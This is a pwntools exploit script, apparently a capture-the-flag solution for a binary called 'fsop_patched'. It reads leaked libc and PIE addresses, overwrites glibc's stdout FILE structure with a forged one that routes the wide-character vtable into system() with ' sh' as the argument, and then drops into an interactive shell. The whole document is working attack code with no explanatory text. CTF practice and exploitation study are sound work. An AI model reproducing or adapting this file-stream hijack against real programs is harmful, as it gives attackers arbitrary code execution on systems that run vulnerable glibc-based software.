#!/usr/bin/env python3

from pwn import *

elf = ELF("./fsop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.REMOTE:
        r = remote()
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *main+210
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    r.recvuntil(b"libc leak:")
    libc.address = int(r.recvline().strip().decode(), 16) - libc.sym["printf"];
    r.recvuntil(b"pie leak:")
    elf.address = int(r.recvline().strip().decode(), 16) - elf.sym["main"]
    log.success(f"LIBC base:\t{hex(libc.address)}")
    log.success(f"PIE base:\t{hex(elf.address)}")
    
    log.info(f"STDOUT address: {hex(libc.sym["_IO_2_1_stdout_"])}")
    r.sendlineafter(b"Where do you want to write? > ", hex(libc.sym["_IO_2_1_stdout_"]).encode())
    
    r.sendlineafter(b"Insert your name for the record: ", b"nome")

    fs = FileStructure()
    fs.flags = b' sh\0\0\0\0\0'
    fs._lock = libc.sym._IO_stdfile_1_lock
    # *(_wide_data+0xc0)=_wide_vtable
    fs._wide_data = libc.sym._IO_2_1_stdout_ - 0x10
    # unknown2 is at offset 0xa8 from an _IO_FILE struct start
    fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(libc.sym._IO_2_1_stdout_ + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps - 0x20 #offset from 'xsputn' to 'overflow'
    payload = bytes(fs)

    r.sendlineafter(b": ", payload)

    r.interactive()


if __name__ == "__main__":
    main()

